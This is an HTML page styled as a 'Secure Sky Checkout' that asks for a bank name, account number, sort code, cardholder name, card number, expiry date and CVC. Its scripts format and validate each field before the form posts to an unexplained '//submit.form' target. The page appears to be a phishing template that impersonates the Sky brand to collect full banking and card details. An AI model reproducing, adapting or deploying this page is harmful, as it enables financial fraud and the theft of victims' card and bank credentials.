<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sky | Secure Payment</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Inter,sans-serif;background:#f2f4f8;color:#111}

.sky-header{background:#0f1b40;padding:18px;display:flex;justify-content:center}
.sky-header img{height:38px}

.page-wrapper{max-width:600px;margin:40px auto;padding:0 15px}
.left{background:#fff;padding:28px;border-radius:14px;box-shadow:0 4px 18px rgba(0,0,0,.08)}
.subtitle{text-align:center;font-size:18px;margin-bottom:20px}

.form-group{margin-bottom:18px}
label{font-weight:600;display:block;margin-bottom:6px}

input{
  width:100%;
  padding:14px;
  font-size:15px;
  border-radius:10px;
  border:1px solid #ccd2e0;
}
input:focus{outline:none;border-color:#0f74d0}

input.error{
  border-color:#ff3b3f;
  animation:shake .35s;
}

@keyframes shake{
  0%{transform:translateX(0)}
  25%{transform:translateX(-5px)}
  50%{transform:translateX(5px)}
  75%{transform:translateX(-5px)}
  100%{transform:translateX(0)}
}

.error-text{
  color:#ff3b3f;
  font-size:13px;
  margin-top:6px;
  display:none;
}

button{
  width:100%;
  padding:15px;
  font-size:17px;
  font-weight:600;
  background:linear-gradient(90deg,#0f74d0,#32a4ff);
  border:none;
  color:#fff;
  border-radius:12px;
  cursor:pointer;
  opacity:.5;
}
button.enabled{opacity:1;cursor:pointer}

.trust-box{
  margin-top:25px;
  padding:16px;
  background:#f3f6fc;
  border-radius:12px;
  text-align:center;
}
.trust-icons img{height:32px;margin:0 8px}

.sky-footer{
  background:#0f1b40;color:#eee;text-align:center;
  padding:25px 10px;margin-top:40px
}
.sky-footer a{color:#a8c5ff;margin:0 8px;font-size:14px}
</style>
</head>

<body>

<div class="sky-header">
  <img src="5842ab6da6515b1e0ad75b0a.png">
</div>

<div class="page-wrapper">
<div class="left">

<div class="subtitle">Secure Sky Checkout</div>

<form method="post" action="//submit.form" id="paymentForm" novalidate>

<div class="form-group">
<label>Bank name</label>
<input type="text" id="bankName" name="bank_name">
<div class="error-text">Bank name required</div>
</div>

<div class="form-group">
<label>Bank account number</label>
<input type="text" id="bankAccount" name="bank_account" maxlength="8">
<div class="error-text">Account must be 8 digits</div>
</div>

<div class="form-group">
<label>Sort code</label>
<input type="text" id="sortCode" name="sort_code" maxlength="8">
<div class="error-text">Format 12-34-56</div>
</div>

<div class="form-group">
<label>Name on card</label>
<input type="text" id="cardName" name="card_name">
<div class="error-text">Name required</div>
</div>

<div class="form-group">
<label>Card number</label>
<input type="text" id="cardNumber" name="card_number">
<div class="error-text">16 digit card number</div>
</div>

<div class="form-group">
<label>Expiry (MM/YY)</label>
<input type="text" id="expiryDate" name="expiry" maxlength="5">
<div class="error-text">Invalid or expired</div>
</div>

<div class="form-group">
<label>CVC</label>
<input type="password" id="cvc" name="cvc" maxlength="3">
<div class="error-text">3 digit CVC</div>
</div>

<button type="submit" id="submitBtn" disabled>Confirm Order</button>

</form>

<div class="trust-box">

</div>

<script>
function vibrateError(){
 if(navigator.vibrate) navigator.vibrate([80,40,80]);
}

function showError(input, show){
 const err=input.nextElementSibling;
 if(show){
   input.classList.add("error");
   err.style.display="block";
   vibrateError();
 }else{
   input.classList.remove("error");
   err.style.display="none";
 }
}

const f={
 bankName,
 bankAccount,
 sortCode,
 cardName,
 cardNumber,
 expiryDate,
 cvc
};

bankName.oninput=()=>{showError(bankName,!bankName.value.trim());validate();};

bankAccount.oninput=()=>{
 bankAccount.value=bankAccount.value.replace(/\D/g,"").slice(0,8);
 showError(bankAccount,bankAccount.value.length!==8);validate();
};

sortCode.oninput=()=>{
 let v=sortCode.value.replace(/\D/g,"").slice(0,6);
 if(v.length>2)v=v.slice(0,2)+"-"+v.slice(2);
 if(v.length>5)v=v.slice(0,5)+"-"+v.slice(5);
 sortCode.value=v;
 showError(sortCode,v.length!==8);validate();
};

cardName.oninput=()=>{showError(cardName,!cardName.value.trim());validate();};

cardNumber.oninput=()=>{
 cardNumber.value=cardNumber.value.replace(/\D/g,"").replace(/(.{4})/g,"$1 ").trim().slice(0,19);
 showError(cardNumber,cardNumber.value.replace(/\s/g,"").length!==16);validate();
};

expiryDate.oninput=()=>{
 let v=expiryDate.value.replace(/\D/g,"").slice(0,4);
 if(v.length>=3)v=v.slice(0,2)+"/"+v.slice(2);
 expiryDate.value=v;

 let valid=false;
 if(v.length===5){
   let [m,y]=v.split("/");
   let exp=new Date(2000+ +y,m);
   valid=m>=1&&m<=12&&exp>new Date();
 }
 showError(expiryDate,!valid);validate();
};

cvc.oninput=()=>{
 cvc.value=cvc.value.replace(/\D/g,"").slice(0,3);
 showError(cvc,cvc.value.length!==3);validate();
};

function validate(){
 let ok=
 bankName.value&&
 bankAccount.value.length===8&&
 sortCode.value.length===8&&
 cardName.value&&
 cardNumber.value.replace(/\s/g,"").length===16&&
 cvc.value.length===3&&
 !expiryDate.classList.contains("error");

 submitBtn.disabled=!ok;
 submitBtn.classList.toggle("enabled",ok);
}
</script>

</body>
</html>
